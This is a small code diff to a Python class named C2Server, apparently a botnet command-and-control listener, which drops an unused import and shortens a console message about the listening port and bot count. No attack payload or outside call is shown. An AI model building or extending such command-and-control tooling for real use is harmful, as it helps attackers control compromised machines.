@@ -1,7 +1,6 @@
 import sys
 import socket
 import threading
-import codecs
 import datetime
 from colorama import init, Fore, Back, Style	# for color and style
 
@@ -33,7 +32,7 @@ class C2Server():
 		soc.bind((self.bind_ip, self.bind_port))
 		soc.listen(10)
 		print(Style.BRIGHT, end='')
-		print(Fore.YELLOW + self.timestamp() + " Listening on port %d with %d bot" % (self.bind_port, len(self.bots)))
+		print(Fore.YELLOW + self.timestamp() + " Listening on port %d" % (self.bind_port))
 		print(Fore.RESET, end='')
 		self.log( self.timestamp() + " Listening on port " + str(self.bind_port))
 		while True:
